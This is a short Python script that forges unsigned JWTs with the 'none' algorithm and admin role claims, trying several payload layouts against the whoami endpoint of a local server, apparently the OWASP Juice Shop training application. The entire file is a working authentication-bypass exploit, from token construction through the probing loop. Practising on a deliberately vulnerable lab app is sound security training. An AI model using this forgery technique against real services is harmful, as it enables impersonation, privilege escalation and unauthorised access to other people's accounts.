
import requests
import base64
import json
import time

def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode()).decode().rstrip('=')

def debug_jwt_structure():
    SERVER = 'http://localhost:3000'
    print('Debugging JWT Payload Structure for "whoami"...')
    
    # We want to make /rest/user/whoami succeed.
    endpoint = '/rest/user/whoami'
    
    iat = int(time.time())
    exp = iat + 3600
    
    variations = [
        {
            "name": "Flat",
            "payload": {"email":"jwtn3d@juice-sh.op", "iat": iat, "exp": exp}
        },
        {
            "name": "Nested data",
            "payload": {
                "data": {"id": 666, "email":"jwtn3d@juice-sh.op", "username": "jwtn3d", "role": "admin"},
                "iat": iat, "exp": exp
            }
        },
        {
            "name": "Nested user",
             "payload": {
                "user": {"id": 666, "email":"jwtn3d@juice-sh.op", "username": "jwtn3d", "role": "admin"},
                "iat": iat, "exp": exp
            }
        }
    ]
    
    header = b64url({"alg":"none","typ":"JWT"})
    
    s = requests.Session()
    
    for v in variations:
        payload_enc = b64url(v['payload'])
        token = f"{header}.{payload_enc}."
        
        print(f"\nTesting {v['name']} Payload: {json.dumps(v['payload'])}")
        
        res = s.get(f'{SERVER}{endpoint}', headers={'Authorization': f'Bearer {token}'})
        
        print(f"Status: {res.status_code}")
        if res.status_code == 200:
            print("SUCCESS! This payload structure works for whoami.")
            print("Response:", res.json())
            return
        elif res.status_code == 500:
             print("Server Error (Structure mismatch likely)")
             if "TypeError" in res.text:
                 print(f"Error Preview: {res.text.split('<pre>')[1].split('<br>')[0] if '<pre>' in res.text else res.text[:200]}")
        else:
             print(f"Failed with {res.status_code}")

if __name__ == '__main__':
    debug_jwt_structure()
